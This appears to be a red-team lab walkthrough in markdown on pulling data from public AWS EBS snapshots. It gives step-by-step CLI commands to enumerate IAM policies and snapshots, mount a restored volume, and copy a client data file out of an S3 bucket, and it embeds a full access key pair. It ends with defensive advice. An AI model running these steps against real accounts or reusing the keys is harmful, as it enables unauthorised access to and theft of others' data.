# Loot Public EBS Snapshots

This documentation provides a step-by-step guide for looting public EBS snapshots, starting from basic AWS credentials and escalating access to extract sensitive data. This guide is intended for ethical red team engagements and educational purposes.

---

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Configure AWS CLI](#configure-aws-cli)
3. [Identify IAM User Context](#identify-iam-user-context)
4. [Enumerate User Policies](#enumerate-user-policies)
5. [Enumerate EBS Snapshots](#enumerate-ebs-snapshots)
6. [Check Snapshot Permissions](#check-snapshot-permissions)
7. [Exfiltrate Public EBS Snapshots](#exfiltrate-public-ebs-snapshots)
8. [Discover Secrets](#discover-secrets)
9. [Defense Recommendations](#defense-recommendations)

---

## 1. Prerequisites

- **AWS CLI** installed on your system.
- **Basic Linux command line knowledge**.
- AWS credentials for enumeration.

---

## 2. Configure AWS CLI

Set up the AWS CLI with the provided credentials. **Do not share your credentials publicly.**

```bash
aws configure
```

When prompted, enter the following placeholder values:

- **AWS Access Key ID**: `AKIARQVIRZ4UCZVR25FQ`
- **AWS Secret Access Key**: `0rXFu1r+KmGY4/lWmNBd6Kkrc9WM9+e9Z1BptzPv`
- **Default region name**: `us-east-1`
- **Default output format**: `json`

---

## 3. Identify IAM User Context

Check your current IAM user context:

```bash
aws sts get-caller-identity
```

This reveals the IAM user and AWS account ID.

---

## 4. Enumerate User Policies

List attached user policies for the IAM user `intern`:

```bash
aws iam list-attached-user-policies --user-name intern
```

### Get Policy Details

Retrieve details of the `PublicSnapper` policy:

```bash
aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper
```

Check the latest policy version (e.g., `v9`):

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v9
```

---

## 5. Enumerate EBS Snapshots

List all EBS snapshots owned by the AWS account `104506445608`:

```bash
aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1
```

---

## 6. Check Snapshot Permissions

Check the `createVolumePermission` attribute to see if the snapshot is public:

```bash
aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0c0679098c7a4e636 --region us-east-1
```

If the `Group` value is set to `all`, the snapshot is publicly accessible.

---

## 7. Exfiltrate Public EBS Snapshots

### List Public Snapshots

List public snapshots available to your IAM user:

```bash
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate --region us-east-1
```

### Create Volume from Snapshot

1. Log in to the AWS Management Console.
2. Navigate to **EC2** > **Snapshots**.
3. Select **Public snapshots**.
4. Filter by **Snapshot ID** (e.g., `snap-0c0679098c7a4e636`).
5. Select the snapshot and choose **Actions** > **Create volume from snapshot**.
6. Create the volume in the appropriate availability zone.

---

## 8. Discover Secrets

### Attach Volume to EC2 Instance

1. Create an EC2 instance in the same availability zone as the volume.
2. Attach the volume to the instance.

### Mount the Volume

SSH into the EC2 instance:

```bash
ssh -i demo.pem ubuntu@<EC2-IP>
```

List storage devices:

```bash
lsblk
```

Mount the volume:

```bash
mkdir disk
sudo mount -t ext4 /dev/xvdf1 disk
```

### Extract Secrets

Navigate to the mounted directory and look for sensitive files:

```bash
cd disk
ls
```

Example: Copy files from an S3 bucket referenced in the secrets:

```bash
aws s3 ls ecorp-client-data
aws s3 cp s3://ecorp-client-data/ecorp_dr_logistics.csv .
```

---

## 9. Defense Recommendations

### Mitigation Steps

- **Avoid creating public EBS snapshots** unless absolutely necessary.
- **Rotate credentials** if exposed.
- **Monitor CloudTrail logs** for snapshot access events.

### Identify Public Snapshots

Use the following command to identify public snapshots:

```bash
aws ec2 describe-snapshots --owner-id self --restorable-by-user-ids all --no-paginate
```

### Further Actions

- **Make snapshots private**.
- **Investigate how the snapshot was made public**.
- **Implement policies to restrict snapshot sharing**.

---

## Further Reading

- [DEFCON 27 Talk on EBS Public Snapshots](https://www.youtube.com/watch?v=HXM1rBk_wXs)
- [RhinoSecurityLabs: Exploring AWS EBS Snapshots](https://rhinosecuritylabs.com/aws/exploring-aws-ebs-snapshots/)
- [Dufflebag Tool by Bishop Fox](https://github.com/bishopfox/dufflebag)

---

**Author:** [Your GitHub Username]  
**License:** MIT
